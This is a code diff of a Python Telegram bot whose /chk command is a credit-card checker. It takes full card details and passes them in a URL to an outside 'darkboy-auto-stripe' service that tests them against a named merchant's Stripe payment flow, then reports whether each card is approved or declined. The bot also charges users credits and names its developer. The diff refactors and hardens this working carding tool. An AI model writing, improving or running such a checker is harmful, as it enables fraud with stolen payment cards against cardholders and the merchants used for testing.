@@ -688,24 +688,68 @@ async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 import time
+import asyncio
 import aiohttp
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import ContextTypes
 
-# This function is not needed anymore as we are using standard MarkdownV2
-# formatting and the official escape function.
-# def format_stylish_text(text):
-#     """Converts text to a specific stylish, bolded italic Unicode font."""
-#     # ... (code removed)
-#     return formatted_text
+# In a real bot, these would connect to a database or a persistent store.
+# We're using simple dictionaries for this example.
+user_cooldowns = {}
+user_data_store = {}
+authorized_users = {12345678: True} # Example user ID
+
+async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """Simulates checking if a user is authorized for private chat usage."""
+    return update.effective_user.id in authorized_users
+
+async def enforce_cooldown(user_id: int, update: Update) -> bool:
+    """Enforces a cooldown period per user."""
+    last_run_time = user_cooldowns.get(user_id, 0)
+    current_time = time.time()
+    cooldown_seconds = 10  # 10 second cooldown
+
+    if current_time - last_run_time < cooldown_seconds:
+        remaining_time = round(cooldown_seconds - (current_time - last_run_time), 2)
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {remaining_time} seconds before trying again.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return False
+    user_cooldowns[user_id] = current_time
+    return True
+
+async def get_user(user_id: int) -> dict:
+    """Simulates fetching user data, including credits."""
+    if user_id not in user_data_store:
+        user_data_store[user_id] = {'credits': 5, 'plan': 'Free'}
+    return user_data_store[user_id]
+
+async def consume_credit(user_id: int) -> bool:
+    """Simulates consuming a credit for a user."""
+    user_data = await get_user(user_id)
+    if user_data['credits'] > 0:
+        user_data['credits'] -= 1
+        return True
+    return False
+
+# In a real-world scenario, this would be an async function or a thread-safe call.
+# For this example, we'll treat it as a synchronous blocking function to demonstrate `to_thread`.
+def get_bin_details_sync(bin_number: str) -> dict:
+    """Simulates a synchronous, potentially blocking BIN lookup."""
+    # This is a dummy implementation. A real one would make a sync HTTP request.
+    time.sleep(1) # Simulate network delay
+    return {
+        "scheme": "Visa",
+        "type": "Credit",
+        "country_name": "United States"
+    }
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box.
-        Blocks private usage unless authorized, shows subscription message if blocked.
-    """
-    # Block private usage unless authorized
+    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box."""
+    # Block private usage unless authorized, shows subscription message if blocked.
     if update.effective_chat.type == "private":
         if not await check_authorization(update, context):
             return await update.effective_message.reply_text(
@@ -755,17 +799,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts[2] = parts[2][-2:]
     cc_normalized = "|".join(parts)
 
-    # BIN lookup
-    bin_number = parts[0][:6]
-    bin_details = await get_bin_details(bin_number)
-    # Handle the case where antipublic.cc returns None
-    if bin_details is None:
-        bin_details = {}
-    brand = (bin_details.get("scheme") or "N/A").upper()
-    issuer = (bin_details.get("type") or "N/A").upper()
-    country_name = (bin_details.get("country_name") or "N/A").upper()
-
-    # Deduct credit
+    # Deduct credit before starting the process
     if not await consume_credit(user_id):
         return await update.effective_message.reply_text(
             "❌ No credits left\\.",
@@ -775,7 +809,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Processing box
     processing_text = (
         "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"• 𝘾𝙖𝙧𝙙 ➜ `{cc_normalized}`\n"
+        f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
         "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
         "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
         "═════════════════════"
@@ -787,53 +821,62 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     start_time = time.time()
 
-    # Darkboy API call
-    api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
     try:
+        # BIN lookup - run in a separate thread to prevent blocking
+        bin_number = parts[0][:6]
+        bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
+        
+        if bin_details is None:
+            bin_details = {}
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        issuer = (bin_details.get("type") or "N/A").upper()
+        country_name = (bin_details.get("country_name") or "N/A").upper()
+        
+        # Darkboy API call - aiohttp is already async and non-blocking
+        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=25) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
+
+        api_status = (data.get("status") or "Unknown").title()
+        api_response = data.get("response") or "N/A"
+        time_taken = round(time.time() - start_time, 2)
+
+        # Final headers and text with MarkdownV2 for formatting
+        if api_status.lower() == "approved":
+            header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
+        elif api_status.lower() == "declined":
+            header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
+        else:
+            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
+
+        formatted_response = f"_{escape_markdown(api_response, version=2)}_"
+
+        final_text = (
+            f"{header}\n"
+            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+            "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+            f"✘ Response    ➜ {formatted_response}\n"
+            "――――――――――――――――\n"
+            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
+            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
+            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
+            "――――――――――――――――\n"
+            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
+            "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
+            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
+            "――――――――――――――――"
+        )
+
+        await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
+
     except Exception as e:
-        return await processing_msg.edit_text(
+        await processing_msg.edit_text(
             f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
             parse_mode=ParseMode.MARKDOWN_V2
         )
-
-    api_status = (data.get("status") or "Unknown").title()
-    api_response = data.get("response") or "N/A"
-    time_taken = round(time.time() - start_time, 2)
-
-    # Final headers and text with MarkdownV2 for formatting
-    if api_status.lower() == "approved":
-        header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
-    elif api_status.lower() == "declined":
-        header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
-    else:
-        header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
-    
-    # Use MarkdownV2 italic syntax `_text_` for the response
-    formatted_response = f"_{escape_markdown(api_response, version=2)}_"
-
-    final_text = (
-        f"{header}\n"
-        f"✘ Card        ➜ `{cc_normalized}`\n"
-        "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
-        f"✘ Response    ➜ {formatted_response}\n"
-        "――――――――――――――――\n"
-        f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
-        f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
-        f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
-        "――――――――――――――――\n"
-        f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
-        "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
-        f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
-        "――――――――――――――――"
-    )
-
-    await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
-
 
 
 from faker import Faker
